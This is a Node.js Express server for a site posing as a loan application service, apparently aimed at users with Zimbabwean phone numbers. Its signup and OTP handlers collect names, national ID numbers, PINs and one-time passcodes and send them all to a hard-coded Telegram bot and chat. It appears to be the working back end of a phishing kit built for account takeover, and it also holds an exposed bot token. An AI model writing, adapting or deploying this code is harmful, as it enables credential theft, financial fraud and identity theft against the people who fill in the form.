const express = require('express');
const path = require('path');
const app = express();

// Configuration
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8895411616:AAHp-t75c2aBIIAdV8k7foAQHRZpUKIK7Gk';
const CHAT_ID = '8565817118';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));


// Serve Main Page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle Sign Up
app.post('/signup', async (req, res) => {
  const { firstName, surname, country, phone, email, nationalId, loanAmount, pin } = req.body;

  let fullPhone = phone;
  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
    fullPhone = '+263' + phone;
  } else if (phone.startsWith('0')) {
    fullPhone = '+263' + phone.substring(1);
  }

  const message = `
📝 <b>New Loan Application</b>

👤 <b>Name:</b> ${firstName} ${surname}
🌍 <b>Country:</b> ${country}
📱 <b>Phone:</b> ${fullPhone}
📧 <b>Email:</b> ${email}
🆔 <b>Native ID:</b> ${nationalId}
💰 <b>Amount:</b> $${loanAmount}
🔑 <b>PIN:</b> <code>${pin}</code>

<i>Waiting for OTP verification...</i>
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    res.send('Success');
  } catch (error) {
    console.error(error);
    res.send('Error');
  }
});

// Handle OTP Verification
app.post('/verify-otp', async (req, res) => {
  const { firstName, surname, country, phone, email, nationalId, loanAmount, pin, otp } = req.body;

  let fullPhone = phone;
  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
    fullPhone = '+263' + phone;
  } else if (phone.startsWith('0')) {
    fullPhone = '+263' + phone.substring(1);
  }

  const message = `
✅ <b>OTP Verified</b>

👤 <b>Name:</b> ${firstName} ${surname}
🌍 <b>Country:</b> ${country}
📱 <b>Phone:</b> ${fullPhone}
📧 <b>Email:</b> ${email}
🆔 <b>Native ID:</b> ${nationalId}
💰 <b>Amount:</b> $${loanAmount}
🔑 <b>PIN:</b> <code>${pin}</code>
📲 <b>OTP:</b> <b>${otp}</b>

<b>Client is ready for loan!</b>
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    res.send('Success');
  } catch (error) {
    console.error(error);
    res.send('Error');
  }
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
